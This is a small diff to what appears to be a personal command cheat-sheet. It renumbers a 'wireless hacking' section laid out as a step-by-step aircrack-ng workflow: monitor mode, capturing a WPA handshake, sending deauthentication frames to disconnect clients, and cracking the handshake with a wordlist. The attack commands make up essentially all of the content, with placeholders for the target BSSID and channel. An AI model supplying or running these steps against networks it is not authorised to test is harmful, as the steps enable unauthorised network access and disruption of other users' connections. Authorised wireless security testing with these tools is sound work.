@@ -168,10 +168,10 @@ systemctl status vsftpd
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # wireless hacking
-sudo airmon-ng start wlan0 #(Put Wi-Fi adapter in monitor mode)
- sudo airodump-ng wlan0mon #(Start capturing traffic:)
- sudo airodump-ng -c [channel] --bssid [BSSID] -w outputfile wlan0mon #(Capture a handshake:)
- sudo aireplay-ng -0 5 -a [BSSID] wlan0mon #(Deauthenticate a client:)
+ 1. sudo airmon-ng start wlan0 #(Put Wi-Fi adapter in monitor mode)
+  2. sudo airodump-ng wlan0mon #(Start capturing traffic:)
+ 3. sudo airodump-ng -c [channel] --bssid [BSSID] -w outputfile wlan0mon #(Capture a handshake:)
+4. sudo aireplay-ng -0 5 -a [BSSID] wlan0mon #(Deauthenticate a client:)
 _____________________________________________________________________________________________________________________________________________________________________________________________
 # Crack the handshake:
 sudo aircrack-ng -w wordlist.txt -b [BSSID] outputfile.cap 
